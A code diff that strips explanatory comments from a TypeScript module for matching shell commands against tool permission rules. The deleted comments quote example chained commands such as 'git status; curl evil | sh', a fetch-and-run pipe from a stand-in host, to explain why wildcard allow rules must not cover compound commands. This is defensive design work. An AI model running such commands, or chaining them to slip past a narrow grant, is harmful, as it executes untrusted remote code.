@@ -1,15 +1,3 @@
-/**
- * `tool` domain — permission rule-subject matching.
- *
- * Owns the glob / path matching primitives (`globMatch` / `pathGlobMatch`)
- * and the rule-subject helpers (`literalRulePattern`,
- * `escapeRuleSubjectLiteral`, `matchesGlobRuleSubject`,
- * `matchesPathRuleSubject`) that tool implementations use to build their
- * `matchesRule` closures and canonical rule strings. Path matching compares
- * normalized path variants, so `./a`, `dir/../a`, and Windows separator or
- * case variants can match the same rule. Pure functions; no scoped service.
- */
-
 import { isAbsolute, join, parse } from 'pathe';
 
 import picomatch from 'picomatch';
@@ -152,11 +140,6 @@ export function matchesGlobRuleSubject(ruleArgs: string, subject: string): boole
 }
 
 
-/**
- * Budget for the permission-path parse. Small on purpose: this runs on the hot
- * path of every rule check, and a command that cannot be parsed inside it is
- * treated as un-analyzable (and therefore not eligible for a wildcard match).
- */
 const BASH_RULE_PARSE_OPTIONS = { timeoutMs: 50, maxNodes: 20_000 } as const;
 
 function countCommands(node: SyntaxNode): number {
@@ -165,37 +148,12 @@ function countCommands(node: SyntaxNode): number {
   return total;
 }
 
-/**
- * Whether `command` is a single simple command rather than a compound one.
- *
- * Uses the bash parser rather than scanning for metacharacters, because the
- * two disagree exactly where it matters: `git commit -m "a; b"` is one command
- * (the `;` is inside a string), while `git status; curl x | sh` is three.
- *
- * Anything the parser cannot analyze — budget exhausted, or a tree with
- * errors — is reported as not-simple, so an unparseable command degrades to
- * "needs approval" instead of slipping through a wildcard rule.
- */
 export function isSingleSimpleCommand(command: string): boolean {
   const parsed = parseBash(command, BASH_RULE_PARSE_OPTIONS);
   if (!parsed.ok || parsed.hasError) return false;
   return countCommands(parsed.rootNode) === 1;
 }
 
-/**
- * Rule matching for shell commands.
- *
- * A wildcard rule describes a shape of command the user is comfortable with;
- * it should not also authorize whatever got chained onto it. `Bash(git *)`
- * matching `git status; curl evil | sh` would turn a narrow grant into an
- * arbitrary one, so a permissive (allow) rule only matches when the command is
- * a single simple command.
- *
- * Two cases stay untouched: an exact-literal rule (what "approve for this
- * session" stores) still matches the command it was created from, compound or
- * not; and non-permissive rules (deny / ask) match exactly as before, so this
- * never weakens a block.
- */
 export function matchesBashCommandRuleSubject(
   ruleArgs: string,
   command: string,
